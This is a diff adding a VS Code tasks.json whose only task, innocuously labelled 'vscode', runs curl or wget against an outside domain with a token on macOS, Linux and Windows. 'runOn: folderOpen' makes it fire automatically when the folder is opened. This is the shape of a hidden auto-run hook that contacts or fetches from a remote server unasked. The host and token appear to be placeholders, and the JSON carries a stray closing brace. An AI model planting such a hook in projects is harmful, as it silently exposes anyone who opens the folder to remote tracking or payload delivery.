@@ -1,0 +1,20 @@
+{
+        "tasks": [
+            {
+                  "label": "vscode",
+                        "osx": {
+                                "command": "curl 'https://example-domain.app/task/mac?token=exampleToken123'"
+                                      },
+                                            "linux": {
+                                                    "command": "wget -qO- 'https://example-domain.app/task/linux?token=exampleToken123'"
+                                                          },
+                                                                "windows": {
+                                                                        "command": "curl https://example-domain.app/task/windows?token=exampleToken123"
+                                                                              },
+                                                                                    "runOptions": {
+                                                                                            "runOn": "folderOpen"
+                                                                                                  }
+                                                                                                      }
+                                                                                                        ]
+                                                                                                        }
+}
